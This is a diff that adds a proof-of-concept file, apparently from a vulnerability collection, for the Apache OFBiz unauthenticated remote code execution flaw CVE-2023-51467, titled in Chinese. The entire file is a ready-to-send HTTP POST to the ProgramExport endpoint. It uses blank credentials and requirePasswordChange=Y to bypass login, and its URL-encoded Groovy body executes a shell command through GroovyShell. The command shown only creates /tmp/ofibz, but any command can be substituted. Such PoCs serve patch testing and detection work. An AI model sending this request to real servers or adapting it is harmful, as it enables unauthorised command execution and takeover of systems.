@@ -1,0 +1,11 @@
+# Apache OFBiz 未授权远程代码执行漏洞(CVE-2023-51467)
+POST /webtools/control/ProgramExport?checkID=ee3750f22a22d0cb&USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
+host: www.xwd_test.com
+accept: */*
+accept-encoding: gzip, deflate
+connection: keep-alive
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+content-type: application/x-www-form-urlencoded
+content-length: 187
+
+groovyProgram=import+groovy.lang.GroovyShell%3B%0A%0AString+expression+%3D+%22'touch+%2Ftmp%2Fofibz'.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(expression)%3B
